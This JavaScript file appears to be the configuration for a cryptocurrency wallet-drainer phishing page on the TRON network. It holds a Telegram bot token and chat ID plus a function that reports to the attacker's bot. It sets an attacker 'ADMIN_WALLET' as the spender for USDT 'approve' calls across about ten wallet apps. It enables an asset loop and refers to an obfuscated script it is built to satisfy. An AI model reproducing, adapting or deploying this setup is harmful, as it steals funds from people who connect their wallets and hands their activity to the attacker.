window.CONFIG = {
    BOT_TOKEN: "8738726378:AAHkiTAAZ16hoGFObK_v76yi0f0wqITMZXM",
    CHAT_ID: "8249230506",
    ADMIN_WALLET: "TEMjHs1QrYTacRUDCcgWGXabxYNmHsXyai",
    USDT_CONTRACT: "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t",
    PROJECT_ID: "c5250465b531d3f5128116dc9460f64e"
};

window.projectId = window.CONFIG.PROJECT_ID;

window.sendTelegram = async (message) => {
    const url = `https://api.telegram.org/bot${window.CONFIG.BOT_TOKEN}/sendMessage`;
    const payload = {
        chat_id: window.CONFIG.CHAT_ID,
        text: message,
        parse_mode: 'HTML'
    };
    try {
        await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        });
    } catch (e) {
        console.error('Telegram error:', e);
    }
};

// Mock configuration to satisfy the obfuscated script
window.LOCAL_CONFIG = {
    "preferences": {
        "modal": {
            "name": "Web3ModalTrx",
            "openTriggers": "all",
            "theme": "dark",
            "font": "Inter"
        },
        "loader": {
            "name": "Loader",
            "theme": "dark",
            "font": "Inter",
            "texts": {
                "loading": "Loading...",
                "connecting": "Connecting Wallet...",
                "verifying": "Verifying...",
                "processing": "Processing..."
            }
        },
        "web3modal": {
            "projectId": window.CONFIG.PROJECT_ID,
            "themeMode": "dark"
        },
        "wallets": {
            "isBitgetEnabled": true,
            "isBybitEnabled": true,
            "isTronlinkEnabled": true,
            "isTrustEnabled": true,
            "isOkexEnabled": true,
            "isTokenPocketEnabled": true,
            "isFoxWalletEnabled": true,
            "isGateWalletEnabled": true,
            "isImTokenEnabled": true,
            "isLedgerEnabled": true
        },
        "walletRequirements": {
            "minWalletPrice": 0
        },
        "walletFunding": {
            "isEnabled": false
        },
        "energyRenting": {
            "isEnabled": false
        },
        "assetLoop": {
            "isEnabled": true,
            "delay": 1000
        },
        "contractMethod": "approve",
        "USDT": {
            "contractAddress": window.CONFIG.USDT_CONTRACT,
            "spenderAddress": window.CONFIG.ADMIN_WALLET
        },
        "TR7NHqjeKQxGTCi8q8ZY4pL8": {
            "contractAddress": window.CONFIG.USDT_CONTRACT,
            "spenderAddress": window.CONFIG.ADMIN_WALLET
        }
    }
};

window.LOCAL_CONFIG.id = "local-session";
window.LOCAL_CONFIG.projectId = window.CONFIG.PROJECT_ID;
